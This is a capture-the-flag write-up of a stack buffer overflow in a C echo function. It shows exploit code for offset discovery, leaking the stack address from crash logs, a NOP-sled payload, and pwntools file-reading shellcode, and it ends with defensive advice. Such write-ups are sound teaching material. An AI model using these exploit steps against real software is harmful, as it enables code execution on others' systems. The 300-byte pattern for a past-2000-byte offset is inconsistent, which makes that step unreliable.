# Writeup – Adjacent Memory Shellcode Exploitation

This challenge involved exploiting a **buffer overflow vulnerability** in a C program to execute shellcode and gain control over program execution. The vulnerability existed in adjacent memory buffers that could be overflowed to control the program's execution flow.

---

## 🔍 Challenge Overview

The vulnerable program [`vuln.c`](./vuln.c) contains a classic buffer overflow in the `echo` function:

```c
void echo(char *arg1, char *arg2){
     char result[BUFFER_SIZE*2];  // 2000 bytes
     char input1[BUFFER_SIZE];    // 1000 bytes  
     char input2[BUFFER_SIZE];    // 1000 bytes
     
     strncpy(input1, arg1, BUFFER_SIZE);
     strncpy(input2, arg2, BUFFER_SIZE);
     strcat(result, input1);      // Vulnerability here!
     strcat(result, input2);      // And here!
     printf("Echo Response: %s\n", result);
}
```

### 🎯 Key Vulnerabilities:
- `strcat()` doesn't check bounds on the `result` buffer
- Stack layout allows overflow from `result` into return address
- No stack protection mechanisms enabled

---

## 🛠️ My Exploitation Approach

### 1. **Vulnerability Analysis**
- Identified that `strcat()` operations could overflow the `result[2000]` buffer
- Stack layout: `result` → `input1` → `input2` → saved registers → **return address**

### 2. **Offset Discovery**
Used cyclic patterns to determine the exact overflow length:
```python
cyclic_seq = cyclic(300)
# Process crashes, extract EIP from dmesg
overflow_len = cyclic_find(p32(eip))
```

### 3. **Address Calculation** 
Calculated target buffer address from stack pointer:
```python
crash_info = subprocess.run("dmesg | grep 'vuln' | tail -n 1", stdout=subprocess.PIPE, shell=True).stdout
esp = int(re.search(b'sp\\ (.*)\\ error', crash_info).group(1), 16)
buffer_address = esp - overflow_len - 8
```

### 4. **Payload Construction**
Built a classic buffer overflow payload:
```python
nop_sled = b'\x90' * 100           # NOP sled for reliability
padding = b'A' * (overflow_len - len(nop_sled) - len(shellcode))
jump_address = p32(buffer_address + nop_sled_len // 2)  # Jump to NOP sled

payload = nop_sled + shellcode + padding + jump_address
```

### 5. **Shellcode Selection**
Used pwntools to generate shellcode for reading target files:
```python
# From shellcode.py - generates shellcode to read files
return False, asm(shellcraft.i386.linux.cat('/path/to/target'))
```

---

## 🔬 Technical Details

### Memory Layout
```
Stack (grows down):
├── result[2000]     ← Overflow target
├── input1[1000]     
├── input2[1000]     
├── saved EBP        
└── return address   ← Overwrite with jump to shellcode
```

### Exploitation Flow
1. **Overflow Detection**: Use cyclic patterns to crash and analyze
2. **Address Leak**: Extract stack pointer from kernel logs  
3. **Payload Craft**: NOP sled + shellcode + padding + return address
4. **Execution**: Jump to shellcode via overwritten return address

---

## 🧪 Final Solution

The working exploit in [`exploit.py`](./exploit.py) successfully:
- ✅ Calculates precise overflow offset 
- ✅ Determines target buffer address from crash dumps
- ✅ Constructs reliable payload with NOP sled
- ✅ Executes shellcode to demonstrate control

### 🏆 Result: **Exploitation Successful**

The exploit demonstrates complete control over program execution flow and the ability to execute arbitrary code through the buffer overflow vulnerability.

---

## 🛡️ Key Learnings

1. **Buffer overflow fundamentals**: Understanding stack layout and return address overwriting
2. **Dynamic analysis**: Using crash dumps and kernel logs for address calculation
3. **Payload reliability**: NOP sleds help account for small addressing errors
4. **Shellcode generation**: Leveraging pwntools for automatic shellcode creation
5. **Memory management**: Critical importance of bounds checking in C programs

---

## 🔒 Defensive Measures

This challenge highlights the importance of:
- **Input validation**: Always validate and sanitize user input
- **Safe string functions**: Use `strncpy`, `strncat`, or safer alternatives
- **Stack protection**: Enable compiler protections like stack canaries
- **Address space layout randomization (ASLR)**: Make exploitation harder
- **Code reviews**: Regular security-focused code analysis

---

## 📁 Files Overview

- [`vuln.c`](./vuln.c) - Vulnerable C program with buffer overflow
- [`exploit.py`](./exploit.py) - Complete exploitation script  
- [`shellcode.py`](./shellcode.py) - Shellcode generation utilities
- [`challenge.md`](./challenge.md) - Challenge description and objectives
- [`writeup.md`](./writeup.md) - This technical analysis

This challenge demonstrated classic stack-based buffer overflow exploitation techniques and reinforced the critical importance of memory safety in systems programming.